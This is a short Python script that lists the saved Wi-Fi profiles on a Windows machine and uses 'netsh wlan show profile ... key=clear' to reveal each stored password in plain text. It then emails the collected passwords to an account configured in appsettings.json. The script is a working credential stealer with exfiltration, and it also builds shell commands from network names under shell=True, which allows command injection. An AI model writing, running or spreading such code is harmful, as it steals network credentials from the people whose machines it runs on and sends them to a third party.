import subprocess
import json
import send_mail
import re

CONFIG = open("appsettings.json")

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

credentials = json.load(CONFIG)
send_mail.send_mail(credentials["EMAIL"], credentials["PASSWORD"], result)